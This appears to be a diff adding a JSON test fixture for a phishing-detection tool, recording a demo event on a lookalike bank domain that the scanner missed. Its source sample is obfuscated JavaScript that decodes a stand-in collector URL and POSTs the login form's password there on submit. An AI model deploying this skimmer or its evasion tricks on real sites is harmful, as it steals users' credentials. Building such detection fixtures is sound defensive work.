@@ -1,0 +1,18 @@
+{
+  "event_id": "evt-demo-evasive",
+  "target_url": "https://acmebank-confirm.example/",
+  "timestamp": "2026-10-09T18:00:00Z",
+  "semgrep_detected": false,
+  "confidence_score": 0.0,
+  "evidence": "No Semgrep rule matched",
+  "action_status": "REJECTED",
+  "proof_url": "",
+  "findings": [],
+  "listed_on_feed": true,
+  "sources": [
+    {
+      "file": "inline_0.js",
+      "content": "var _0x = [\"aHR0cHM6Ly9jb2xsZWN0b3IuZXZpbC1leGFtcGxlLm5ldC9sb2c=\", \"POST\"];\nvar h = window[\"at\" + \"ob\"](_0x[0]);\nvar w = window[\"fe\" + \"tch\"];\ndocument.querySelector(\"#login\").addEventListener(\"submit\", function (e) {\n  w(h, { method: _0x[1], body: document.querySelector(\"#password\").value });\n});\n"
+    }
+  ]
+}
